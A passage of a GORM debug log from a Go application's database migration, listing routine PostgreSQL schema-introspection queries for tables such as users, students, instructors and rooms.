[0m[33m[1.053ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.065ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.075ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.138ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.039ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.085ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.377ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.046ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.840ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.357ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.416ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.218ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'students'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.679ms] [34;1m[rows:-][0m SELECT * FROM "students" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.922ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[16.046ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.889ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'students'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.066ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.610ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.087ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.226ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.060ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'is_premiem') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[8.633ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.932ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND constraint_name = 'fk_students_user'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.803ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_students_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.800ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_student_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.684ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.411ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.479ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'instructors'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.579ms] [34;1m[rows:-][0m SELECT * FROM "instructors" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[16.658ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.404ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.726ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'instructors'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.108ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.127ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.076ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.449ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.076ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'account_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.122ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.130ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND constraint_name = 'fk_instructors_user'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.858ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructors_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.838ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructor_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.661ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.375ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.829ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'rooms'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.643ms] [34;1m[rows:-][0m SELECT * FROM "rooms" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[16.364ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[18.205ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.873ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'rooms'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.814ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.119ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.097ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.071ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.096ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'title') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.151ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'description') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.094ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'room_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.126ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.112ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'instructor_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.935ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND constraint_name = 'fk_rooms_instructor'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.791ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'rooms' AND indexname = 'idx_rooms_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.634ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND table_type = 'BASE TABLE'

